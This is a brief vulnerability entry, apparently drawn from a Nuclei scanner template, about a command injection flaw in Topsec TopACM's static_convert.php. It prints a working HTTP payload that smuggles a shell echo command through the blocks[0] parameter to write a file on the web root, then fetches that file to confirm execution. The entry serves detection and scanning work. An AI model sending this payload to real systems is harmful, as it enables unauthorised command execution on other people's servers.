# Vulnerability: Topsec Topacm - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`topsec-topacm-rce.yaml`)

## Description
Tianrongxin Internet Behavior Management System static_convert.php remote command execution vulnerability

## Vulnerable Code Pattern / Exploit Payload
```http
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20%27{{randstr}}%27%20%3E%20/var/www/html/config_application.txt%0a HTTP/1.1
Host: {{Hostname}}

GET /config_application.txt HTTP/1.1
Host: {{Hostname}}
```

